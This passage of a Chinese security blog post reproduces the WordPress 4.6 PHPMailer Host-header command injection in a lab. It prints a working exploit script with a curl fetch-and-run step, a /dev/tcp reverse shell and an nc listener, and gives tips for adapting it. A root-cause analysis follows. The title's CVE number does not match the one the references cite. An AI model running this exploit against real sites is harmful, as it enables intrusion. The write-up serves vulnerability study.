<span class="hljs-string">G1s2Qy4bWzE7MzRtZHh4eHh4YyAgICAbWzBtbGRkT01NTU1XZDBNTU1NS2RkZC4gICAbWzM0bS54</span>
<span class="hljs-string">eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s2QxtbMG0uY05NTU1OLm9NTU1NeCcb</span>
<span class="hljs-string">WzZDG1szNG0ueHh4eHh4Og0KG1szN20gG1s2QxtbMTszNG0uZHh4eHh4YxtbNUMbWzBtbEtvO2RO</span>
<span class="hljs-string">TU4ub01NMDs6T2suICAgIBtbMzRtJ3h4eHh4eDoNChtbMzdtIBtbNkMbWzE7MzRtLmR4eHh4eGMg</span>
<span class="hljs-string">ICAgG1swbTtNYyAgIC5seC46bywgICAgS2wgICAgG1szNG0neHh4eHh4Og0KG1szN20gG1s2Qxtb</span>
<span class="hljs-string">MTszNG0uZHh4eHh4ZGw7LiAuLBtbMTVDG1swOzM0bS4uIC47Y2R4eHh4eHg6DQobWzM3bSAbWzZD</span>
<span class="hljs-string">G1sxOzM0bS5keHh4eCAbWzBtX19fX19fX18bWzEwQ19fX18gIF9fX19fIBtbMzRteHh4eHg6DQob</span>
<span class="hljs-string">WzM3bSAbWzdDG1sxOzM0bS4nOm94IBtbMG1cG1s2Qy9fIF9fX19fX19fXCAgIFwvICAgIC8gG1sz</span>
<span class="hljs-string">NG14eGMsLg0KG1szN20gG1sxMUMbWzE7MzRtLiAbWzBtLxtbNUMvICBcXBtbOEM+G1s3QzwgIBtb</span>
<span class="hljs-string">MzRteCwNChtbMzdtIBtbMTJDLxtbMTBDLyAgIHwgICAvICAgL1wgICAgXA0KIBtbMTJDXF9fX19f</span>
<span class="hljs-string">X19fXzxfX19fX19fPF9fX18+IFxfX19fPg0KIBtbMjFDG1sxOzM0bS4nOm9keC4bWzA7MzRtY2t4</span>
<span class="hljs-string">bCwuDQobWzM3bSAbWzI1QxtbMTszNG0uLC4bWzA7MzRtJy4NChtbMzdtIA0K"</span>
intro2=<span class="hljs-string">"</span>
<span class="hljs-string">ICAgICAgICAgICAgICAgICAgIBtbNDRtfCBFeHBsb2l0Qm94LmlvIHwbWzBtCgobWzk0bSsgLS09</span>
<span class="hljs-string">fBtbMG0gG1s5MW1Xb3JkcHJlc3MgQ29yZSAtIFVuYXV0aGVudGljYXRlZCBSQ0UgRXhwbG9pdBtb</span>
<span class="hljs-string">MG0gIBtbOTRtfBtbMG0KG1s5NG0rIC0tPXwbWzBtICAgICAgICAgICAgICAgICAgICAgICAgICAg</span>
<span class="hljs-string">ICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBtChtbOTRtKyAtLT18G1swbSAgICAgICAgICBE</span>
<span class="hljs-string">aXNjb3ZlcmVkICYgQ29kZWQgQnkgICAgICAgICAgICAgICAgG1s5NG18G1swbQobWzk0bSsgLS09</span>
<span class="hljs-string">fBtbMG0gICAgICAgICAgICAgICAbWzk0bURhd2lkIEdvbHVuc2tpG1swbSAgICAgICAgICAgICAg</span>
<span class="hljs-string">ICAgIBtbOTRtfBtbMG0gChtbOTRtKyAtLT18G1swbSAgICAgICAgIBtbOTRtaHR0cHM6Ly9sZWdh</span>
<span class="hljs-string">bGhhY2tlcnMuY29tG1swbSAgICAgICAgICAgICAgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBt</span>
<span class="hljs-string">ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBt</span>
<span class="hljs-string">ChtbOTRtKyAtLT18G1swbSAiV2l0aCBHcmVhdCBQb3dlciBDb21lcyBHcmVhdCBSZXNwb25zaWJp</span>
<span class="hljs-string">bGl0eSIgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBtICAgICAgICAqIEZvciB0ZXN0aW5nIHB1</span>
<span class="hljs-string">cnBvc2VzIG9ubHkgKiAgICAgICAgICAbWzk0bXwbWzBtIAoKCg=="</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$intro</span>"</span>  | <span class="hljs-built_in">base64</span> -d
<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$intro2</span>"</span> | <span class="hljs-built_in">base64</span> -d
 
<span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$#</span>"</span> -ne 1 ]; <span class="hljs-keyword">then</span>
<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"Usage:\n<span class="hljs-variable">$0</span> target-wordpress-url\n"</span>
<span class="hljs-built_in">exit</span> 1
<span class="hljs-keyword">fi</span>
target=<span class="hljs-string">"<span class="hljs-variable">$1</span>"</span>
<span class="hljs-built_in">echo</span> -ne <span class="hljs-string">"\e[91m[*]\033[0m"</span>
<span class="hljs-built_in">read</span> -p <span class="hljs-string">" Sure you want to get a shell on the target '<span class="hljs-variable">$target</span>' ? [y/N] "</span> choice
<span class="hljs-built_in">echo</span>
 
<span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$choice</span>"</span> == <span class="hljs-string">"y"</span> ]; <span class="hljs-keyword">then</span>
 
<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\e[92m[*]\033[0m Guess I can't argue with that... Let's get started...\n"</span>
<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\e[92m[+]\033[0m Connected to the target"</span>
 
<span class="hljs-comment"># Serve payload/bash script on :80</span>
RCE_exec_cmd=<span class="hljs-string">"(sleep 3s &amp;&amp; nohup bash -i &gt;/dev/tcp/<span class="hljs-variable">$rev_host</span>/5555 0&lt;&amp;1 2&gt;&amp;1) &amp;"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$RCE_exec_cmd</span>"</span> &gt; rce.txt
python -mSimpleHTTPServer 80 2&gt;/dev/null &gt;&amp;2 &amp;
hpid=$!
 
<span class="hljs-comment"># Save payload on the target in /tmp/rce</span>
cmd=<span class="hljs-string">"/usr/bin/curl -o/tmp/rce <span class="hljs-variable">$rev_host</span>/rce.txt"</span>
prep_host_header <span class="hljs-string">"<span class="hljs-variable">$cmd</span>"</span>
curl -H<span class="hljs-string">"Host: <span class="hljs-variable">$host_header</span>"</span> -s -d <span class="hljs-string">'user_login=@1_h bcx&amp;wp-submit=Get+New+Password'</span> <span class="hljs-variable">$target</span>/wp-login.php?action=lostpassword
<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n\e[92m[+]\e[0m Payload sent successfully"</span>
 
<span class="hljs-comment"># Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rce</span>
cmd=<span class="hljs-string">"/bin/bash /tmp/rce"</span>
prep_host_header <span class="hljs-string">"<span class="hljs-variable">$cmd</span>"</span>
curl -H<span class="hljs-string">"Host: <span class="hljs-variable">$host_header</span>"</span> -d <span class="hljs-string">'user_login=@1_h bcx&amp;wp-submit=Get+New+Password'</span> <span class="hljs-variable">$target</span>/wp-login.php?action=lostpassword &amp;
<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n\e[92m[+]\033[0m Payload executed!"</span>
 
<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n\e[92m[*]\033[0m Waiting for the target to send us a \e[94mreverse shell\e[0m...\n"</span>
nc -nvv -l -p 5555
<span class="hljs-built_in">echo</span>
<span class="hljs-keyword">else</span>
<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\e[92m[+]\033[0m Responsible choice ;) Exiting.\n"</span>
<span class="hljs-built_in">exit</span> 0
 
<span class="hljs-keyword">fi</span>
 
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Exiting..."</span>
<span class="hljs-built_in">exit</span> 0</code></pre>
<h3 id="脚本需要修改的部分">脚本需要修改的部分</h3>
<p>三个地方 第一处 #1 line 1</p>
<pre><code class="hljs plaintext">rev_host="192.168.57.1" #1</code></pre>
<p>这边要替换成你的攻击机的ip地址，一般是和靶机处在一个局域网内的，可以提前访问下wordpress的网站进行测试。<br>
第二处 #2 line 75</p>
<p>第三处 #3 line 80</p>
<pre><code class="hljs sh">curl -H<span class="hljs-string">"Host: <span class="hljs-variable">$host_header</span>"</span> -s -d <span class="hljs-string">'user_login=admin&amp;wp-submit=Get+New+Password'</span> <span class="hljs-variable">$target</span>/wp-login.php?action=lostpassword <span class="hljs-comment">#2</span>
<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n\e[92m[+]\e[0m Payload sent successfully"</span>
<span class="hljs-comment"># Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rce</span>
cmd=<span class="hljs-string">"/bin/bash /tmp/rce"</span>
prep_host_header <span class="hljs-string">"<span class="hljs-variable">$cmd</span>"</span>
curl -H<span class="hljs-string">"Host: <span class="hljs-variable">$host_header</span>"</span> -d <span class="hljs-string">'user_login=admin&amp;wp-submit=Get+New+Password'</span> <span class="hljs-variable">$target</span>/wp-login.php?action=lostpassword &amp; <span class="hljs-comment">#3</span></code></pre>
<p>这两个地方主要要修改的可能是user_login=admin这个参数，这个poc里默认的是admin<br>
这里其实就是你装wordpress时管理员的或者任意一个用户的邮箱<br>
因为找回密码时他会先判断邮箱是否存在，再进行下一步<br>
如果这里邮箱不存在 你发包是返回200 告诉你邮箱不存在<br>
如果是存在有的邮箱，就是返回302跳转到输入邮箱密码的界面 同时告诉你邮件已经发了<br>
下面是burp模拟攻击时候的抓包 返回的是302时说明已经命令执行成功</p>
<p>![image-20230829164046765](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829164046765.png)</p>
<p>可以看到靶机上也确实出现了rce文件</p>
<p>这边执行的命令是<code>/usr/bin/wget --output-document /tmp/rce 124.220.233.26/a.txt</code></p>
<p>![image-20230829164134260](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829164134260.png)</p>
<p>这三个地方改好了之后，脚本就可以运行了</p>
<h3 id="脚本的主要流程">脚本的主要流程：</h3>
<blockquote>
<ol>
<li>生成本地rce.txt 里面写的是是建立连接的命令</li>
<li>命令执行第一次 curl攻击机获取rce.txt 写到/tmp目录下</li>
<li>命令执行第二次 运行tmp目录下的rce</li>
<li>nc连接靶机</li>
</ol>
</blockquote>
<h2 id="0x06-漏洞原理深入">0x06 漏洞原理深入</h2>
<p>将docker中的wordpress源码拷贝出来<code>sudo docker cp pwnscriptum_web_1:/var/www/html /home/jgc/code</code></p>
<p>根据忘记密码页面的url<code>wp-login.php?action=lostpassword</code>定位到<code>wp-login.php</code>的<code>retrieve_password</code>函数，此函数是对密码的操作函数。</p>
<p>此函数中对用户输入进行处理后，最后通过以下代码发送邮件</p>
<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">retrieve_password</span>(<span class="hljs-params"></span>) </span>{
	......
        
	<span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">apply_filters</span>( <span class="hljs-string">'retrieve_password_message'</span>, <span class="hljs-variable">$message</span>, <span class="hljs-variable">$key</span>, <span class="hljs-variable">$user_login</span>, <span class="hljs-variable">$user_data</span> );

	<span class="hljs-keyword">if</span> ( <span class="hljs-variable">$message</span> &amp;&amp; !<span class="hljs-title function_ invoke__">wp_mail</span>( <span class="hljs-variable">$user_email</span>, <span class="hljs-title function_ invoke__">wp_specialchars_decode</span>( <span class="hljs-variable">$title</span> ), <span class="hljs-variable">$message</span> ) )
		<span class="hljs-title function_ invoke__">wp_die</span>( <span class="hljs-title function_ invoke__">__</span>(<span class="hljs-string">'The email could not be sent.'</span>) . <span class="hljs-string">"&lt;br /&gt;\n"</span> . <span class="hljs-title function_ invoke__">__</span>(<span class="hljs-string">'Possible reason: your host may have disabled the mail() function.'</span>) );

	<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
}</code></pre>
<p>跟进<code>wp_mail</code>函数，定位到<code>/wp-includes/pluggable.php</code></p>
<p>函数中其中关于host的设置如下</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span> ( !<span class="hljs-keyword">isset</span>( <span class="hljs-variable">$from_name</span> ) )
		<span class="hljs-variable">$from_name</span> = <span class="hljs-string">'WordPress'</span>;

	<span class="hljs-keyword">if</span> ( !<span class="hljs-keyword">isset</span>( <span class="hljs-variable">$from_email</span> ) ) {
		<span class="hljs-comment">// Get the site domain and get rid of www.</span>
		<span class="hljs-variable">$sitename</span> = <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'SERVER_NAME'</span>] );
		<span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">substr</span>( <span class="hljs-variable">$sitename</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span> ) == <span class="hljs-string">'www.'</span> ) {
			<span class="hljs-variable">$sitename</span> = <span class="hljs-title function_ invoke__">substr</span>( <span class="hljs-variable">$sitename</span>, <span class="hljs-number">4</span> );
		}

		<span class="hljs-variable">$from_email</span> = <span class="hljs-string">'wordpress@'</span> . <span class="hljs-variable">$sitename</span>;
	}

	<span class="hljs-variable">$from_email</span> = <span class="hljs-title function_ invoke__">apply_filters</span>( <span class="hljs-string">'wp_mail_from'</span>, <span class="hljs-variable">$from_email</span> );

	<span class="hljs-variable">$from_name</span> = <span class="hljs-title function_ invoke__">apply_filters</span>( <span class="hljs-string">'wp_mail_from_name'</span>, <span class="hljs-variable">$from_name</span> );

	<span class="hljs-variable">$phpmailer</span>-&gt;<span class="hljs-title function_ invoke__">setFrom</span>( <span class="hljs-variable">$from_email</span>, <span class="hljs-variable">$from_name</span> );</code></pre>
<p>根据代码可以看出wordpress基于<code>$_SERVER['SERVER_NAME']</code>来构造<code>$from_email</code>发送邮件的域，前面拼接上<code>wordpress@</code></p>
<p><code>$_SERVER['SERVER_NAME']</code>参数是通过请求头<code>Host</code>字段传入，并且这里只是简单的使用<code>substr</code>去掉了前面的<code>www.</code>，没有任何过滤措施。</p>
<p>在docker中添加a.php代码来查看<code>$_SERVER['SERVER_NAME']</code>的值</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'SERVER_NAME'</span>])){
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'SERVER_NAME'</span>];
}<span class="hljs-keyword">else</span>{
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"no value"</span>;
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>在下图中看到就是Host字段的值</p>
<p>![image-20230829160821813](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829160821813.png)</p>
<p>接着跟进<code>setFrom</code>函数，定位到<code>wp-includes/class-phpmailer.php</code>，发现其用到了PHPMailer组件</p>
<p><code>setFrom</code>函数如下，这个函数对数据进行校验，没问题的话设置Sender变量为address变量的值</p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setFrom</span>(<span class="hljs-params"><span class="hljs-variable">$address</span>, <span class="hljs-variable">$name</span> = <span class="hljs-string">''</span>, <span class="hljs-variable">$auto</span> = <span class="hljs-literal">true</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable">$address</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$address</span>);
        <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'/[\r\n]+/'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$name</span>)); <span class="hljs-comment">//Strip breaks and trim</span>
        <span class="hljs-comment">// Don't validate now addresses with IDN. Will be done in send().</span>
        <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$pos</span> = <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$address</span>, <span class="hljs-string">'@'</span>)) === <span class="hljs-literal">false</span> <span class="hljs-keyword">or</span>
            (!<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">has8bitChars</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$address</span>, ++<span class="hljs-variable">$pos</span>)) <span class="hljs-keyword">or</span> !<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">idnSupported</span>()) <span class="hljs-keyword">and</span>
            !<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">validateAddress</span>(<span class="hljs-variable">$address</span>)) {
            <span class="hljs-variable">$error_message</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">lang</span>(<span class="hljs-string">'invalid_address'</span>) . <span class="hljs-variable">$address</span>;
            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">setError</span>(<span class="hljs-variable">$error_message</span>);
            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">edebug</span>(<span class="hljs-variable">$error_message</span>);
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;exceptions) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">phpmailerException</span>(<span class="hljs-variable">$error_message</span>);
            }
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        <span class="hljs-variable language_">$this</span>-&gt;From = <span class="hljs-variable">$address</span>;
        <span class="hljs-variable language_">$this</span>-&gt;FromName = <span class="hljs-variable">$name</span>;
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$auto</span>) {
            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;Sender)) {
                <span class="hljs-variable language_">$this</span>-&gt;Sender = <span class="hljs-variable">$address</span>;
            }
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }</code></pre>
<p>其中<code>validateAddress()</code>函数在同文件下，函数前半部分如下</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$patternselect</span> <span class="hljs-keyword">or</span> <span class="hljs-variable">$patternselect</span> == <span class="hljs-string">'auto'</span>) {
            <span class="hljs-comment">//Check this constant first so it works when extension_loaded() is disabled by safe mode</span>
            <span class="hljs-comment">//Constant was added in PHP 5.2.4</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">defined</span>(<span class="hljs-string">'PCRE_VERSION'</span>)) {
                <span class="hljs-comment">//This pattern can get stuck in a recursive loop in PCRE &lt;= 8.0.2</span>
                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">version_compare</span>(PCRE_VERSION, <span class="hljs-string">'8.0.3'</span>) &gt;= <span class="hljs-number">0</span>) {
                    <span class="hljs-variable">$patternselect</span> = <span class="hljs-string">'pcre8'</span>;
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-variable">$patternselect</span> = <span class="hljs-string">'pcre'</span>;
                }
            } <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">'extension_loaded'</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">'pcre'</span>)) {
                <span class="hljs-comment">//Fall back to older PCRE</span>
                <span class="hljs-variable">$patternselect</span> = <span class="hljs-string">'pcre'</span>;
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">//Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension</span>
                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">version_compare</span>(PHP_VERSION, <span class="hljs-string">'5.2.0'</span>) &gt;= <span class="hljs-number">0</span>) {
                    <span class="hljs-variable">$patternselect</span> = <span class="hljs-string">'php'</span>;
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-variable">$patternselect</span> = <span class="hljs-string">'noregex'</span>;
                }
            }
        }</code></pre>
<p>经过测试发现<code>$patternselect</code>变量被设置为pcre8，因此在函数后面执行如下代码中的pcre8的case</p>
<pre><code class="hljs php"><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$patternselect</span>) {
          <span class="hljs-keyword">case</span> <span class="hljs-string">'pcre8'</span>:
              ...
          <span class="hljs-keyword">case</span> <span class="hljs-string">'pcre'</span>:
              ...
          <span class="hljs-keyword">case</span> <span class="hljs-string">'html5'</span>:
              ...
          <span class="hljs-keyword">case</span> <span class="hljs-string">'noregex'</span>:
		...
          <span class="hljs-keyword">case</span> <span class="hljs-string">'php'</span>:
          <span class="hljs-keyword">default</span>:
              ...
      }</code></pre>
<p>pcre8的代码注释</p>
<blockquote>
<p>Uses the same RFC5322 regex on which FILTER_VALIDATE_EMAIL is based, but allows dotless domains.</p>
</blockquote>
<p>基于php内置的邮箱验证的基础上做的修改</p>
<blockquote>
<p><code>php</code> Use PHP built-in FILTER_VALIDATE_EMAIL;</p>
</blockquote>
<p>查阅php官网</p>
<p>![image-20221115091819538.png](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/1668523449643126528.png)</p>
<p>这个验证方式允许使用括号或双引号使邮箱地址包含空格，因此在Hosts字段构造的发件人的邮箱可以是</p>
<pre><code class="hljs plaintext">target(any -froot@localhost -be ${run{$payload}} null)@qq.com</code></pre>
<p>经过验证和过滤之后的函数调用</p>
<pre><code class="hljs php"><span class="hljs-variable">$phpmailer</span>
=&gt;<span class="hljs-title function_ invoke__">Send</span>()		wp-includes/pluggable.php<span class="hljs-comment">#471</span>
=&gt;<span class="hljs-title function_ invoke__">postSend</span>() 	wp-includes/<span class="hljs-class"><span class="hljs-keyword">class</span>-<span class="hljs-title">phpmailer</span>.<span class="hljs-title">php</span>#1125</span>
<span class="hljs-class">=&gt;<span class="hljs-title">mailSend</span>()	<span class="hljs-title">wp</span>-<span class="hljs-title">includes</span>/<span class="hljs-title">class</span>-<span class="hljs-title">phpmailer</span>.<span class="hljs-title">php</span>#1247</span>
<span class="hljs-class">=&gt;<span class="hljs-title">mailPassthru</span>()	<span class="hljs-title">wp</span>-<span class="hljs-title">includes</span>/<span class="hljs-title">class</span>-<span class="hljs-title">phpmailer</span>.<span class="hljs-title">php</span>#1368</span></code></pre>
<p>将payload传入到<code>mailPassthru()</code>函数中，函数代码如下</p>
<pre><code class="hljs javascript">private <span class="hljs-keyword">function</span> <span class="hljs-title function_">mailPassthru</span>(<span class="hljs-params">$to, $subject, $body, $header, $params</span>)
   {
       <span class="hljs-comment">//Check overloading of mail function to avoid double-encoding</span>
       <span class="hljs-keyword">if</span> (<span class="hljs-title function_">ini_get</span>(<span class="hljs-string">'mbstring.func_overload'</span>) &amp; <span class="hljs-number">1</span>) {
           $subject = $this-&gt;<span class="hljs-title function_">secureHeader</span>($subject);
       } <span class="hljs-keyword">else</span> {
           $subject = $this-&gt;<span class="hljs-title function_">encodeHeader</span>($this-&gt;<span class="hljs-title function_">secureHeader</span>($subject));
       }
       <span class="hljs-keyword">if</span> (<span class="hljs-title function_">ini_get</span>(<span class="hljs-string">'safe_mode'</span>) || !($this-&gt;<span class="hljs-title class_">UseSendmailOptions</span>)) {
           $result = @<span class="hljs-title function_">mail</span>($to, $subject, $body, $header);
       } <span class="hljs-keyword">else</span> {
           $result = @<span class="hljs-title function_">mail</span>($to, $subject, $body, $header, $params);
       }
       <span class="hljs-keyword">return</span> $result;
   }</code></pre>
<p>由于没有开启安全模式，因此调用的是<code>$result = @mail($to, $subject, $body, $header, $params);</code></p>
<p><code>@mail</code>是调用原生的<code>mail()</code>，在<code>/wp-includes/class-phpmailer.php</code>中定义</p>
<pre><code class="hljs javascript"><span class="hljs-comment">/**</span>
<span class="hljs-comment">    * Which method to use to send mail.</span>
<span class="hljs-comment">    * Options: "mail", "sendmail", or "smtp".</span>
<span class="hljs-comment">    * <span class="hljs-doctag">@var</span> <span class="hljs-variable">string</span></span>
<span class="hljs-comment">    */</span>
   public $Mailer = <span class="hljs-string">'mail'</span>;	
<span class="hljs-comment">/**</span>
<span class="hljs-comment">    * The path to the sendmail program.</span>
<span class="hljs-comment">    * <span class="hljs-doctag">@var</span> <span class="hljs-variable">string</span></span>
<span class="hljs-comment">    */</span>
   public $Sendmail = <span class="hljs-string">'/usr/sbin/sendmail'</span>;</code></pre>
<p>查阅php手册</p>
<pre><code class="hljs php"><span class="hljs-title function_ invoke__">mail</span>(
    <span class="hljs-keyword">string</span> <span class="hljs-variable">$to</span>,
    <span class="hljs-keyword">string</span> <span class="hljs-variable">$subject</span>,
    <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span>,
    <span class="hljs-keyword">array</span>|<span class="hljs-keyword">string</span> <span class="hljs-variable">$additional_headers</span> = [],
    <span class="hljs-keyword">string</span> <span class="hljs-variable">$additional_params</span> = <span class="hljs-string">""</span>
): <span class="hljs-keyword">bool</span></code></pre>
<p>对第五个参数有如下描述</p>
<blockquote>
<p>The <code>additional_params</code> parameter can be used to pass  additional flags as command line options to the program configured to be used when sending mail, as defined by the <code>sendmail_path</code> configuration setting. For example, this can be used to set the envelope sender address when using sendmail with the <code>-f</code> sendmail option.</p>
<p>This parameter is escaped by escapeshellcmd() internally to prevent command execution. escapeshellcmd() prevents command execution, but allows to add additional parameters.  For security reasons, it is recommended for the user to sanitize this  parameter to avoid adding unwanted parameters to the shell command.</p>
<p>‘additional_params’参数可用于将附加标志作为命令行选项传递给配置为在发送邮件时使用的程序，如’  sendmail_path ‘配置设置所定义的那样。例如，当使用带有’-f’  sendmail选项的sendmail时，可以使用它来设置信封发送者地址。</p>
<p>该参数通过escapeshellcmd()在内部转义，以防止命令执行。escapeshellcmd()阻止命令的执行，但是允许添加额外的参数。出于安全考虑，建议用户对该参数进行消毒，以避免向shell命令添加不必要的参数。</p>
</blockquote>
<p>实际上phpmailer组件是调用linux系统命令<code>sendmail</code>进行邮件发送，命令格式为：<code>sendmail -t -i -fusername@hostname</code></p>
<p>mail() 执行后，会执行这样的指令 <code>sendmail -t -i -fwordpress@过滤后的数据包头中的Host字段值</code></p>
<p>另外<code>sendmail</code>符号链接到<code>exim4</code>，<code>exim4</code>的<code>-be</code>参数能开启字符串扩展测试模式，允许提取一些变量数据</p>
<p><code>$tod_log</code>返回系统时间，<code>$spool_directory</code>返回路径值<code>/var/spool/exim4</code>，因此可以用<code>${substr{10}{1}{$tod_log}}</code>代替空格、<code>${substr{0}{1}{$spool_directory}}</code>代替斜杠来绕过<code>-be</code>后面参数中空格和斜杠，以及<code>run</code>可以运行程序</p>
<p>因此上面提到的payload</p>
<p>因此上面提到的payload</p>
<pre><code class="hljs javascript"><span class="hljs-title function_">target</span>(any -froot@localhost -be ${run{$payload}} <span class="hljs-literal">null</span>)</code></pre>
<p>最后变成</p>
<pre><code class="hljs javascript">sendmail -t -i -fwordpress@<span class="hljs-title function_">target</span>(any -froot@localhost -be ${run{$payload}} <span class="hljs-literal">null</span>)</code></pre>
<p>这样就可以执行run中的命令</p>
<p>如果直接在命令行里使用，需要给run加引号</p>
<p>![image-20230829161640747](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829161640747.png)</p>
<h2 id="0x07-参考文章">0x07 参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40228200/article/details/128461257">wordpress 4.6任意命令执行漏洞（PwnScriptum）复现</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2301">WordPress &lt;= 4.6 命令执行漏洞(PHPMailer)(CVE-2016-10033)复现分析</a></p>
<p>[<a target="_blank" rel="noopener" href="https://wuxiuo.com/archives/83">WordPress 4.6 任意命令执行漏洞 (PwnScriptum)</a>](<a target="_blank" rel="noopener" href="https://wuxiuo.com/archives/83">https://wuxiuo.com/archives/83</a>)</p>
<p><a target="_blank" rel="noopener" href="https://bbs.huaweicloud.com/blogs/383372">深入分析WordPress4.6(PHPMailer)命令执行漏洞(CVE-2016-10033)</a></p>
<p><a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/wordpress/pwnscriptum/">Wordpress 4.6 远程代码执行漏洞（PwnScriptum）</a></p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2023/08/25/wordpress-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian-cve-2018-15877/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2023/08/25/wordpress-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian-cve-2018-15877/')">WordPress 远程命令执行漏洞复现(CVE-2018-15877)</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont 